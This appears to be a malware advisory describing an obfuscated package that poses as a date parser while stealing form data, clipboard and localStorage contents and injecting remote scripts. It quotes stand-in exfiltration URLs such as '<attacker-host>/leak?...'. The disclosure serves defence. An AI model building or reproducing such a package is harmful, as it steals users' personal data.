summary: Obfuscated PII-exfiltration and remote script injection in package posing as date parser
details: The package advertises itself as a date parser but its src/index.js is a heavily obfuscated (obfuscator.io-style rotated base64 string array with runtime decoder) payload that performs multiple attacker-beneficial actions in the context of the integrating web application. It attaches a delegated jQuery click handler on Ant Design 'Add client' modal buttons, reads name/phone/address form input values, and POSTs them via fetch to a remote endpoint of the form <attacker-host>/leak?name=...&phone=...&address=.... It registers a beforeunload handler that navigator.sendBeacon()s two localStorage values (keys literally named 'stolen-data-sended-on-unload-event' and 'data_stolen_on_unload_base64') to <attacker-host>/leak?data_stolen=... and <attacker-host>/leak?data_stolen_on_unload_base64=.... It appends a <script src='//<attacker-host>/tag_added_via_script_file_tag_appending.js'></script> to document head and also passes a constructed string referencing the same host to eval(), loading and executing attacker-controlled JavaScript in the host page. It also polls navigator.clipboard.readText() into a module-scoped variable. A hex-encoded PDF is decoded via atob + Blob download to serve as cover. The destination host, endpoint paths, DOM selectors, and localStorage key names are all hidden behind the string-array decoder.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
